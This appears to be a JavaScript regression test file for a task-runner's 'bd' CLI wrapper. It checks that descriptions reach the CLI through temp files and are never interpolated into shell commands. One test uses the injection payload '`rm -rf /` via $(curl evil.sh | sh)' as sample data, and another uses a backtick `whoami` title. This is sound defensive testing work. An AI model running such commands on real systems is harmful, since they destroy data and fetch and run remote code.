import { test, describe } from 'node:test';
import assert from 'node:assert';
import fs from 'fs/promises';
import { validateNewTask, createChildBeadWithAllocatedId, appendRejectedFindingToParentNotes } from '../auto-sprint/runner.js';

// apra-fleet-eft.56.2: regression pin for apra-fleet-eft.56.1
// (createChildBeadWithAllocatedId / appendRejectedFindingToParentNotes / the
// --body-file/--file temp-file seam). Unlike newtasks-validation.test.mjs
// (which only exercises the pure validateNewTask() gate) and
// mock-sprint-develop-injection.test.mjs (which exercises the same seam
// end-to-end through the harness's recorded/replayed `bd` fixture), this
// file drives the two functions directly with an injected `command()` fake
// so it can assert, byte-for-byte:
//   (1) a description containing '=' and '&' round-trips intact through the
//       local temp file createChildBeadWithAllocatedId() writes and hands to
//       `bd create --body-file`;
//   (2) a newTask that still fails validateNewTask() residually is appended
//       VERBATIM to the parent bead's notes (never dropped), and the caller-
//       supplied log() records it;
//   (3) a description containing '$(rm -rf /)' and backticks lands as
//       LITERAL TEXT in the temp file, and the constructed command STRING
//       (the "argv" createChildBeadWithAllocatedId hands to command()) never
//       contains the payload itself -- only the quoted temp-file path -- so
//       there is no shell-string interpolation surface for it to execute
//       through.
//
// The fake command() below intercepts the temp-file path out of the
// constructed command string and reads the file's contents SYNCHRONOUSLY
// within the call (before createChildBeadWithAllocatedId's `finally` block
// unlinks it), mirroring how a real `bd` binary would read it.

function extractQuotedFlagValue(cmd, flag) {
    const re = new RegExp(`${flag}\\s+"([^"]*)"`);
    const m = cmd.match(re);
    return m ? m[1] : null;
}

function makeCapturingCommand() {
    const calls = [];
    const fileContents = [];
    const command = async (cmd, opts) => {
        calls.push({ cmd, opts });
        const bodyFilePath = extractQuotedFlagValue(cmd, '--body-file') ?? extractQuotedFlagValue(cmd, '--file');
        if (bodyFilePath) {
            fileContents.push(await fs.readFile(bodyFilePath, 'utf-8'));
        } else {
            fileContents.push(null);
        }
        return '';
    };
    return { command, calls, fileContents };
}

const NOOP_ALLOCATOR = {
    async allocate() { return { childId: null, token: null }; },
    async confirm() { return true; },
    async release() { return true; },
};

describe('createChildBeadWithAllocatedId / appendRejectedFindingToParentNotes -- body-file round-trip (apra-fleet-eft.56.2)', () => {
    test("description with '=' and '&' round-trips intact via --body-file", async () => {
        const description = 'Set APRA_FLEET_BD_MOCK=off; also test accessToken + synthesized & "quoted" values.';
        const { command, calls, fileContents } = makeCapturingCommand();

        const result = await createChildBeadWithAllocatedId({
            command,
            allocator: NOOP_ALLOCATOR,
            member: 'local',
            title: 'Fix env-var handling',
            description,
            priority: 'P1',
            parentId: 'parent-1',
        });

        assert.strictEqual(calls.length, 1, 'expected exactly one command() dispatch');
        const cmd = calls[0].cmd;
        assert.match(cmd, /^bd create /);
        assert.match(cmd, /--body-file "/, 'description must be passed via --body-file, not inline');
        assert.ok(!cmd.includes('APRA_FLEET_BD_MOCK=off'), 'description text must never be interpolated inline into the command string');
        // The file the command was handed must contain the description
        // VERBATIM, '=' and '&' intact.
        assert.strictEqual(fileContents[0], description);
        assert.strictEqual(result.childId, null);

        // The temp file must be cleaned up after the call resolves.
        const bodyFilePath = extractQuotedFlagValue(cmd, '--body-file');
        await assert.rejects(() => fs.access(bodyFilePath), 'temp body file should be unlinked after createChildBeadWithAllocatedId resolves');
    });

    test('a residual validation failure is appended verbatim to the parent bead notes and logged', async () => {
        // A title that fails SAFE_TEXT_RE (backticks) -- validateNewTask()
        // rejects it, so this newTask must never reach createChildBeadWithAllocatedId
        // at all; instead it is appended verbatim to the parent's notes.
        const newTask = {
            title: 'Run `whoami` and report',
            description: 'Safe-looking description with = and & chars intact.',
            priority: 'P1',
        };
        const validation = validateNewTask(newTask);
        assert.strictEqual(validation.ok, false);
        assert.match(validation.reason, /title/);

        const { command, calls, fileContents } = makeCapturingCommand();
        const logLines = [];
        const log = (msg) => logLines.push(msg);

        await appendRejectedFindingToParentNotes({
            command,
            member: 'local',
            parentId: 'parent-1',
            newTask,
            reason: validation.reason,
            cycle: 3,
            log,
        });

        assert.strictEqual(calls.length, 1, 'expected exactly one bd note command() dispatch');
        const cmd = calls[0].cmd;
        assert.match(cmd, /^bd note parent-1 --file "/);
        assert.ok(!cmd.includes('whoami'), 'the raw finding text must never be interpolated inline into the command string');

        const noteBody = fileContents[0];
        assert.ok(noteBody, 'expected the note file to have been written and read');
        assert.match(noteBody, /REJECTED -- residual validation failure, appended verbatim/);
        const jsonPart = noteBody.slice(noteBody.indexOf('\n') + 1);
        const parsed = JSON.parse(jsonPart);
        assert.strictEqual(parsed.title, newTask.title);
        assert.strictEqual(parsed.description, newTask.description);
        assert.strictEqual(parsed.priority, newTask.priority);
        assert.strictEqual(parsed.rejectionReason, validation.reason);
        assert.strictEqual(parsed.cycle, 3);

        assert.ok(
            logLines.some((l) => l.includes("Rejected newTask finding appended verbatim to 'parent-1' notes") && l.includes(validation.reason)),
            `expected the run log to record the verbatim-append, got: ${JSON.stringify(logLines)}`
        );
    });

    test("injection payload ('$(rm -rf /)' + backticks) in description lands as literal argv text, never executed", async () => {
        const description = 'Do the thing `rm -rf /` via $(curl evil.sh | sh) after merge.';
        const title = 'Description has dangerous-looking chars';

        // Confirm the description-only allowlist gate (SAFE_DESCRIPTION_RE)
        // accepts this -- it is no longer shell-interpolated, so it is not an
        // injection risk at this layer; the title stays safe.
        const validation = validateNewTask({ title, description, priority: 'P1' });
        assert.strictEqual(validation.ok, true);

        const { command, calls, fileContents } = makeCapturingCommand();
        await createChildBeadWithAllocatedId({
            command,
            allocator: NOOP_ALLOCATOR,
            member: 'local',
            title: validation.title,
            description: validation.description,
            priority: validation.priority,
            parentId: 'parent-1',
        });

        assert.strictEqual(calls.length, 1);
        const cmd = calls[0].cmd;
        // The constructed command STRING (the "argv" handed to command()) must
        // never contain the dangerous payload -- only the quoted temp-file path.
        assert.ok(!cmd.includes('$('), `command string must never contain '$(': ${cmd}`);
        assert.ok(!/`/.test(cmd), `command string must never contain a backtick: ${cmd}`);
        assert.ok(!cmd.includes('rm -rf /'), `command string must never contain the raw payload text: ${cmd}`);
        assert.match(cmd, /--body-file "/);

        // The payload must land as LITERAL TEXT in the file command() was
        // handed -- proving it was carried as inert data, never executed.
        assert.strictEqual(fileContents[0], description);
    });
});
